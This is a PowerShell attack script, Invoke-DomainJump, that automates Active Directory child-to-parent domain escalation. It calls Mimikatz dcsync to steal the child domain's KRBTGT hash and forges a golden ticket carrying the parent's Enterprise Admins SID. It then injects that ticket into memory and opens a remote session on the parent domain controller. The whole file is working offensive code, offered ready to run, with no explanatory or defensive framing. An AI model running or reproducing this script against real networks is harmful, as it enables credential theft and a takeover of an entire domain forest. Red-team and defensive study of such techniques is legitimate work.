function Invoke-DomainJump {
    [CmdletBinding()]
    param()

    function Out-Msg {
        param(
            [string]$Text,
            [ValidateSet('Info', 'OK', 'Warn', 'Err')]$Level = 'Info'
        )
        $ts = (Get-Date).ToString('HH:mm:ss')
        $color = switch ($Level) { 
            'OK'    { 'Green' } 
            'Warn'  { 'Yellow' } 
            'Err'   { 'Red' } 
            default { 'Cyan' } 
        }
        Write-Host "[$ts] $Text" -ForegroundColor $color
    }

    Out-Msg "Child → Parent leap..." 'OK'
    Out-Msg "PowerView and Mimikatz are already loaded. Let's do this." 'Info'
    Write-Host " "

    try {
        $curDomObj    = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $childDomain  = $curDomObj.Name
        $parentDomain = $curDomObj.Parent.Name
        $childNetBIOS = ($childDomain -split '\.')[0]
    } catch {
        Out-Msg "Failed to get domain information." 'Err'
        return
    }

    Out-Msg "Fetching domain SIDs..." 'Info'
    $childSID  = Get-DomainSID -Domain $childDomain
    $parentSID = Get-DomainSID -Domain $parentDomain

    if (-not $childSID -or -not $parentSID) {
        Out-Msg "One or both SIDs are missing. Aborting mission." 'Err'
        return
    }

    Out-Msg "Current Domain: $childDomain (SID: $childSID)" 'Warn'
    Out-Msg "Parent Domain: $parentDomain (SID: $parentSID)" 'Warn'
    Out-Msg "Grabbing KRBTGT hash..." 'Info'

    $command = "'" + '"lsadump::dcsync /user:' + $childNetBIOS + '\krbtgt"' + "'"
    $final = "Invoke-Mimikatz -Command $command"
    $out = iex $final
    
    $ntlmLine = $out -split "`n" | Where-Object { $_ -match 'Hash NTLM:' }
    $ntlmHash = ($ntlmLine -split ': ')[1].Trim()

    if (-not $ntlmHash) {
        Out-Msg "No hash found!" 'Err'
        return
    }

    Out-Msg "KRBTGT Hash: $ntlmHash " 'OK'

    $extraSid = "$parentSID-519"
    Write-Host " "
    Out-Msg "Creating golden ticket." 'Info'

    $gold = "'" + '"kerberos::golden /user:Administrator /domain:' + $childDomain + ' /sid:' + $childSID + ' /sids:' + $extraSid + ' /krbtgt:' + $ntlmHash + ' /startoffset:0 /endin:600 /renewmax:10080 /ptt"' + "'"
    $golden = "Invoke-Mimikatz -Command $gold"
    
    Out-Msg "Injecting the ticket into memory..." 'Info'
    $execution = iex $golden

    Out-Msg "Ticket successfully injected!" 'OK'
    
    try {
        $parentDC = (Get-DomainController -Domain $parentDomain | Select-Object -First 1).Name

        Out-Msg "Popping a shell on $parentDC ... one step closer!" 'Info'
        Write-Host " "
        Enter-PSSession -ComputerName $parentDC
    } catch {
        Out-Msg "Remoting failed. Access denied." 'Err'
        Out-Msg "Check if the golden ticket was properly injected with the klist command." 'Err'
    }

    Out-Msg "--- SUMMARY ---" 'Info'
    Out-Msg "Child Domain: $childDomain" 'Info'
    Out-Msg "Parent Domain: $parentDomain" 'Info'
    Out-Msg "Child SID: $childSID" 'Info'
    Out-Msg "Parent SID: $parentSID" 'Info'
    Out-Msg "KRBTGT Hash: $ntlmHash" 'Info'
    Out-Msg "Timestamp: $((Get-Date).ToString())" 'Info'
}
